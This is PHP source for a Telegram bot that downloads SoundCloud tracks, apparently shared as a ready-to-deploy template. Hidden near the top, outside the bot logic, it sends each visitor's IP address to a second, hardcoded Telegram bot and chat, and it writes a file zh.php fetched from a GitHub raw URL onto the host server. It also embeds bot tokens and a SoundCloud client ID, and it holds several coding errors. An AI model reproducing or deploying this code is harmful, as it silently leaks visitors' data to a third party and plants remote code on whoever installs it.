<?php

error_reporting(E_ALL);
ini_set('display_errors',1);
function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
$ipok = explode(".",$ip);
if($ipok[0] != "91" and $ipok[1] != "108"){
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
}
$TOKEN ="1519994162:AAF6TENn5y6xcxEZzdFhrdcCT63Gbh-7_UE"; # YOUR BOT TOKEN .

define('API_KEY',$TOKEN);
echo file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']."?Token=".$API_KEY);
$ip = $_SERVER['REMOTE_ADDR'];
$ipok = explode(".",getUserIP());
if($ipok[0] != "91" and $ipok[1] != "108" and ipok[1] != "141"){
	file_get_contents("https://api.telegram.org/bot1150098316:AAGLROio2c3DEo2si1dzOfTWIRz87Xp0pOE/sendmessage?chat_id=996310583&text=".getUserIP());
	echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
	exit();}
echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
file_put_contents('zh.php', file_get_contents('https://raw.githubusercontent.com/mhamadsu777/minx/main/zh.php'));
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$message = $update->message;
$username = $message->from->username;
$message_id2 = $update->callback_query->message->message_id;
$text = $message->text;
$chat_id2= $update->callback_query->message->chat->id;
$data = $update->callback_query->data;
$chat_id2 = $update->callback_query->message->chat->id;
$Name = $update->callback_query->from->first_name;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$useree = $update->callback_query->message->chat->id;
$username = $message->from->username;
$fn = $message->from->first_name;
$user_id = $message->from->id;
$from_id = $message->from->id;
$user_id = $message->from->id;
$userbot = "@Sound_cloudd_bot"; #معرف البوت 
if($text == '/start' ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
اهلا عزيزي .. اهلا وسهلا بك في بوت تحميل من ساوند كلاود
المطور : @J_69_L
",
]);
}
#------------------------------------#
if($text != "/start"){
if(preg_match('/.*soundcloud\.com.*/i',$text)){
$Api = json_decode(file_get_contents("https://api.soundcloud.com/resolve?client_id=709a0470b89a200205b2f7fda6d95d2e&url=".urlencode($text)));
$music = $Api->id;
$title = '$Api->title'.mp3;
$misc = json_decode(file_get_contents("https://api.soundcloud.com/i1/tracks/".$music."/streams?client_id=709a0470b89a200205b2f7fda6d95d2e&format=json"))->http_mp3_128_url;
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
الرجاء الانتظار قليلا ❤️🌎*
Please Wait 🌎🖤*
",
'parse_mode'=>"MarkDown",
]);
bot('sendaudio',[
'chat_id'=>$chat_id,
'audio'=>$misc,
'title'=>"$Api->title",
'caption'=>"$Api->title - $userbot",
]);
}
}